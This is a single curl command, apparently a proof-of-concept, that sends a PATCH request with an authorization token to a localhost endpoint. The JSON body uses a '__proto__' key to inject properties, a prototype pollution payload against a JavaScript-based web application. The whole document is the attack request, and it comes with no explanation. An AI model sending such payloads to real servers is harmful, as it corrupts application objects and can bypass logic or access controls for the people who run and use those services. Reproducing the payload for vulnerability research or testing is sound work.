curl -X PATCH http://localhost:8000/jackfromeast \
     -H 'authorization: token 864f2da1-0e48-4705-84f3-1e7b67ded586' \
     -H 'content-type: application/json' \
     -d '{"__proto__": {"zzz": "polluted!!!", "title": null}}'